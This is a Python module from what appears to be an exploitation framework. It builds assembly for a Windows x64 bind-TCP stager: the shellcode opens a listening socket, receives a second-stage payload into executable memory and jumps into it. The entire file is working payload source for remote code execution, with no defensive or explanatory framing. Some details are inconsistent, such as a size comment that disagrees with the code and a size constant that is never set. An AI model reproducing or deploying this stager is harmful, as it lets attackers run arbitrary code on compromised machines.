import struct
from collections.abc import Mapping, Sequence

from teralibs.tsf.core.module.base import Base
from teralibs.tsf.core.payload.windows.x64.block_api_x64 import BlockApiX64
from teralibs.tsf.core.payload.windows.x64.exitfunk_x64 import ExitfunkX64
from teralibs.tsf.pex.terasm.api import Terasm


class BindTcpX64(Base):
    """Windows x64 bind-TCP stager."""

    OPTIONS: Sequence = ["RHOST", "LPORT", "EXITFUNC"]
    STAGER_CONF: Mapping = {}

    # Corrected size values to match standard Windows x64 stager bounds
    CACHED_SIZE: int
    AVAILABLE_SPACE: int | None = None

    def __init__(self):
        self.exitfunk = ExitfunkX64()
        self.blockapi = BlockApiX64()

    def include_send_uuid(self) -> bool:
        """By default, we don't want to send the UUID, but we'll send for certain payloads if requested."""
        return False

    def use_ipv6(self) -> bool:
        """By default, we use IPv4, but this can be overridden for certain payloads if requested."""
        return False

    def required_space(self) -> int:
        """Determine the maximum amount of space required for the features requested."""
        space = self.CACHED_SIZE

        # EXITFUNK 'seh' adds 15 bytes.
        space += 31

        # 2 more bytes are added for IPv6 support.
        space += 2 if self.use_ipv6() else 0

        return space

    def generate(self, ctx) -> bytes:
        """Simulates the core entry step to prepare options before full assembly generation."""
        conf = {"port": int(ctx.get_option("LPORT")), "reliable": False}

        available_space = getattr(ctx, "available_space", None) or self.AVAILABLE_SPACE
        if available_space is not None and self.CACHED_SIZE and self.required_space() <= available_space:
            conf["exitfunk"] = ctx.get_option("EXITFUNC")
            conf["reliable"] = True

        return Terasm("x86", 64, "nasm").assemble(self.generate_bind_tcp(conf), addr=0x1000)

    def generate_bind_tcp(self, opts: dict) -> str:
        """Generates the NASM code for the bind-TCP stager based on the provided configuration."""
        asm = f"""
            cld                         ; Clear the direction flag.
            and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned
            call start                  ; Call start, this pushes the address of 'api_call' onto the stack.
            {self.blockapi.asm_block_api()}
            start:
                pop rbp                 ; pop off the address of 'api_call' for calling later.
            {self.asm_bind_tcp(opts)}
            {self.asm_block_recv(opts)}
        """

        return asm

    def asm_bind_tcp(self, opts: dict) -> str:
        """Generates the NASM code for the bind-TCP connection setup."""

        addr_fam = 2
        sockaddr_size = 16
        stack_alloc = 408 + 8 + 8 * 6 + 32 * 7

        if self.use_ipv6():
            addr_fam = 23
            sockaddr_size = 28
            stack_alloc += 2

        encoded_port = f"0x{struct.unpack('>I', struct.pack('<H', int(opts.get('port', 0))) + struct.pack('>H', addr_fam))[0]:016x}"

        asm = f"""
            bind_tcp:

                ; setup the structures we need on the stack...

                mov r14, 0x32335f327377             ; Use the exact hex representation for 'ws2_32' (little-endian)
                push r14                            ; Push the bytes 'ws2_32',0,0 onto the stack.
                mov r14, rsp                        ; save pointer to the "ws2_32" string for LoadLibraryA call.
                sub rsp, 0x{408 + 8:016x}           ; alloc sizeof( struct WSAData ) bytes for the WSAData

                ; structure (+8 for alignment)

                mov r13, rsp                        ; save pointer to the WSAData structure for WSAStartup call.
                xor rax, rax
        """

        if self.use_ipv6():
            asm += """

                ; IPv6 requires another 12 zero-bytes for the socket structure,
                ; so push 16 more onto the stack

                push rax
                push rax
            """

        asm += f"""
                push rax               ; stack alignment
                push rax               ; tail-end of the sockaddr_in/6 struct
                mov r12, {encoded_port}

                push r12               ; bind to 0.0.0.0/[::] family AF_INET/6 and specified port
                mov r12, rsp           ; save pointer to sockaddr_in struct for bind call

                ; perform the call to LoadLibraryA...

                mov rcx, r14           ; set the param for the library to load

                mov r10d, {self.blockapi.block_api_hash("kernel32.dll", "LoadLibraryA")}

                call rbp               ; LoadLibraryA( "ws2_32" )

                ; perform the call to WSAStartup...

                mov rdx, r13           ; second param is a pointer to this struct
                push 0x0101            ;
                pop rcx                ; set the param for the version requested

                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "WSAStartup")}

                call rbp               ; WSAStartup( 0x0101, &WSAData );

                ; perform the call to WSASocketA...

                push 0x{addr_fam:02x}
                pop rcx                ; pop family into rcx
                push rax               ; if we succeed, rax will be zero, push zero for the flags param.
                push rax               ; push null for reserved parameter
                xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure
                xor r8, r8             ; we do not specify a protocol
                inc rax                ;
                mov rdx, rax           ; push SOCK_STREAM

                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "WSASocketA")}

                call rbp               ; WSASocketA( AF_INET/6, SOCK_STREAM, 0, 0, 0, 0 );
                mov rdi, rax           ; save the socket for later

                ; perform the call to bind...

                push 0x{sockaddr_size:02x}
                pop r8                 ; length of the sockaddr_in struct (we only set the

                ; first 8 bytes as the rest aren't used)

                mov rdx, r12           ; set the pointer to sockaddr_in struct
                mov rcx, rdi           ; socket

                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "bind")}

                call rbp               ; bind( s, &sockaddr_in, 0x{sockaddr_size:02x} );

                ; perform the call to listen...

                xor rdx, rdx           ; backlog
                mov rcx, rdi           ; socket

                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "listen")}

                call rbp               ; listen( s, 0 );

                ; perform the call to accept...

                xor r8, r8             ; we set length for the sockaddr struct to zero
                xor rdx, rdx           ; we dont set the optional sockaddr param
                mov rcx, rdi           ; listening socket

                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "accept")}

                call rbp               ; accept( s, 0, 0 );

                ; perform the call to closesocket...

                mov rcx, rdi           ; the listening socket to close
                mov rdi, rax           ; swap the new connected socket over the listening socket

                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "closesocket")}

                call rbp               ; closesocket( s );

                ; restore RSP so we dont have any alignment issues with the next block...

                add rsp, 0x{stack_alloc:016x} ; cleanup the stack allocations
        """

        return asm

    def asm_block_recv(self, opts: dict) -> str:
        """Generates the NASM code for the recv loop to read the next stage payload."""
        asm = f"""
            recv:
                ; Receive the size of the incoming second stage...

                sub rsp, 16            ; alloc some space (16 bytes) on stack for to hold the second stage length
                mov rdx, rsp           ; set pointer to this buffer
                xor r9, r9             ; flags
                push 4                 ;
                pop r8                 ; length = sizeof( DWORD );
                mov rcx, rdi           ; the saved socket

                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "recv")}

                call rbp               ; recv( s, &dwLength, 4, 0 );
                add rsp, 32            ; we restore RSP from the api_call so we can pop off RSI next

                ; Alloc a RWX buffer for the second stage

                pop rsi                ; pop off the second stage length
                mov esi, esi           ; only use the lower-order 32 bits for the size
                push 0x40              ;
                pop r9                 ; PAGE_EXECUTE_READWRITE
                push 0x1000            ;
                pop r8                 ; MEM_COMMIT
                mov rdx, rsi           ; the newly received second stage length.
                xor rcx, rcx           ; NULL as we dont care where the allocation is.

                mov r10d, {self.blockapi.block_api_hash("kernel32.dll", "VirtualAlloc")}

                call rbp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

                ; Receive the second stage and execute it...

                mov rbx, rax           ; rbx = our new memory address for the new stage
                mov r15, rax           ; save the address so we can jump into it later

            read_more:
                xor r9, r9             ; flags
                mov r8, rsi            ; length
                mov rdx, rbx           ; the current address into our second stages RWX buffer
                mov rcx, rdi           ; the saved socket

                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "recv")}

                call rbp               ; recv( s, buffer, length, 0 );

                add rbx, rax           ; buffer += bytes_received
                sub rsi, rax           ; length -= bytes_received
                test rsi, rsi          ; test length
                jnz read_more          ; continue if we have more to read
                jmp r15                ; return into the second stage
        """

        if opts.get("exitfunk"):
            asm += self.exitfunk.asm_exitfunk(opts, self.blockapi.block_api_hash)

        return asm
